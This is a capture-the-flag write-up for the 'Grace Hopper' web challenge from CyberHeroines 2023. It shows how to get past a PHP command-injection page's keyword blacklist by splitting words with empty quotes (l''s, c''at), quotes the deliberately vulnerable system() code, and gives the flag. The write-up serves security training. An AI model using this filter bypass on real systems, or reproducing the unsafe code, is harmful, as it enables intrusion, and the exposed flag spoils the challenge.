# CyberHeroines 2023

## Grace Hopper

> [Grace Brewster Hopper](https://en.wikipedia.org/wiki/Grace_Hopper) (née Murray; December 9, 1906 – January 1, 1992) was an American computer scientist, mathematician, and United States Navy rear admiral. One of the first programmers of the Harvard Mark I computer, she was a pioneer of computer programming who invented one of the first linkers. Hopper was the first to devise the theory of machine-independent programming languages, and the FLOW-MATIC programming language she created using this theory was later extended to create COBOL, an early high-level programming language still in use today. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Grace_Hopper)
> 
> Chal: Command [this webapp](https://cyberheroines-web-srv2.chals.io/vulnerable.php) like [this Navy Real Admiral](https://www.youtube.com/watch?v=1LR6NPpFxw4)
>
>  Author: [Sandesh](https://github.com/Sandesh028)
>

Tags: _web_

## Solution
A webapp is given that allows us to enter and execute `commands`. Typing in `id` gives us `uid=33(www-data) gid=33(www-data) groups=33(www-data)` so php executes just system commands. 

To do a bit of enumeration we can enter `ls` but this time we get `You think it's that easy? Try harder!` as a result. So we have to bypass a whitelist. Thankfully the whitelist is very basic and we can bypass it by using quotes like `l''s`, this gives us:

```bash
cyberheroines.sh
cyberheroines.txt
vulnerable.php
```

Printing the `cyberheroines.txt` with `c''at cyberheroines.txt` gives us `e2d49cb900cc2b8aad02d972099366c44381e3e7c24736312ca839fbd18743a7`. Ok, this is even mentioned at the page: `Hint: The file contains a SHA256 hash of the flag.` But still not usefull, since cracking this is probably not feasible. There are other files to be read though.

For one we can check out the php code for more informations:

```php
<?php
$output = '';
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    $blacklist = array('cat', 'ls', 'more', 'tac', 'nl', 'head', 'tail', 'awk', 'sed');
    $safe_to_run = true;
    foreach ($blacklist as $word) {
        if (strpos($cmd, $word) !== false) {
            $safe_to_run = false;
            $output = "You think it's that easy? Try harder!";
            break;
        }
    }

    if ($safe_to_run) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    }
}
?>
```

Nothing here, but one file remaining and `c''at cyberheroines.sh` gives us the flag.

```bash
FLAG="CHCTF{t#!$_!s_T#3_w@Y}"
echo -n "$FLAG" | sha256sum > cyberheroines.txt
```

Flag `CHCTF{t#!$_!s_T#3_w@Y}`